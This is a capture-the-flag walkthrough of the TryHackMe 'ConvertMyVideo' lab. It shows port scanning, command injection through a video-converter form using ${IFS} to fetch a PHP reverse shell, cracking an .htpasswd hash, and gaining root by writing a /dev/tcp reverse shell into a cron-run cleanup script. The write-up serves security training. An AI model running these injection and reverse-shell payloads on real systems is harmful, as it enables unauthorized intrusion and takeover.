# THM - ConvertMyVideo

#### Ip: 10.10.10.79
#### Name: ConvertMyVideo
#### Rating: Medium

----------------------------------------------------------------------

convert.png

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/THM/ConvertMyVideo]
└─$ sudo nmap -p-  --min-rate 10000 10.10.13.182
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 13:51 CDT
Warning: 10.10.13.182 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.13.182
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds
```

We can enumerate further by scanning the open ports, but this time use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 651bfc741039dfddd02df0531ceb6dec (RSA)
|   256 c42804a5c3b96a955a4d7a6e46e214db (ECDSA)
|_  256 ba07bbcd424af293d105d0b34cb1d9b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

Heading over to the site we find a page that appears to be a video converter. 

site.png

And it appears to error out when anything is entered:

wrong.png

Let's capture this in Burp so we can take a closer look at what is going on here.

Here I entered 'hey!' into the field and captured it in Burp. It looks like it is in fact making a POST request, and is appending the entered info into youtube.com. 

Playing around with this field a bit more, I tried entering in `id` into the field and saw that we have code execution here!

id.png

Lets try something more malicious with this now. 

### Exploitation

Lets bring a copy of php-reverse-shell.php to our working directory and update the IP address and Port fields:

php.png

We can now set up both a Netcat listener as well as a Python http server. Heading back into Burp we can update the `yt_url` field with: `wget${IFS}http://10.6.61.45/php-reverse-shell.php` (${IFS} is a built in Bash variable standing for Internal Field Separator. This lets us account for the space in the command)

Checking back in the terminal our Python logs show the command worked and the file was downloaded.

```text
┌──(ryan㉿kali)-[~/THM]
└─$ python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.13.182 - - [27/Jul/2023 14:29:16] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

We can now navigate to http://10.10.13.182/php-reverse-shell.php and catch a reverse shell back in our listener.

```text
┌──(ryan㉿kali)-[~/THM/ConvertMyVideo]
└─$ nc -lvnp 443               
listening on [any] 443 ...
connect to [10.6.61.45] from (UNKNOWN) [10.10.13.182] 32874
Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:30:59 up 46 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
dmv
```

We can grab the first flag in the `/var/www/html/admin` directory:

user_flag.png

Also of interest here are two hidden files. Let's check those out:

```text
www-data@dmv:/var/www/html/admin$ cat .htaccess
AuthName "AdminArea"
AuthType Basic
AuthUserFile /var/www/html/admin/.htpasswd
Require valid-user
www-data@dmv:/var/www/html/admin$ cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

Cool, looks like we've found some credentials. Copying the hash back to my attacking machine I can quickly crack it with JohntheRipper:

hash.png

But it doesn't appear I can use the credential anywhere locally. 

```text
www-data@dmv:/var/www/html/admin$ cd /home
www-data@dmv:/home$ ls
dmv
www-data@dmv:/home$ su dmv
Password: 
su: Authentication failure
www-data@dmv:/home$ su root
Password: 
su: Authentication failure
```
Lets keep poking around.

### Privilege Escalation


Based on the credential username, I navigated to `/admin` in the browser and found a "Clean Downloads" button. Checking out the source code we find:

clear.png

Interesting, lets check that out in the shell we have. 

```text
www-data@dmv:/var/www/html/tmp$ cat clean.sh
rm -rf downloads
```

Because this file is owned by root, and it's purpose is to just clear out directories, I'm wondering if it is a cronjob.

Lets write to it a reverse shell using:

```text
echo "bash -i >& /dev/tcp/10.6.61.45/53 0>&1" > clean.sh
```

And wait with a listener on our attack box.

Nice! We've caught a shell back as root!

```text
┌──(ryan㉿kali)-[~/THM/ConvertMyVideo]
└─$ nc -lvnp 53                
listening on [any] 53 ...
connect to [10.6.61.45] from (UNKNOWN) [10.10.215.88] 40476
bash: cannot set terminal process group (1388): Inappropriate ioctl for device
bash: no job control in this shell
root@dmv:/var/www/html/tmp# whoami
whoami
root
root@dmv:/var/www/html/tmp# hostname
hostname
dmv
```

Lets grab that last flag:

root_flag.png

Thanks for following along!

-Ryan

--------------------------------------------------------------------------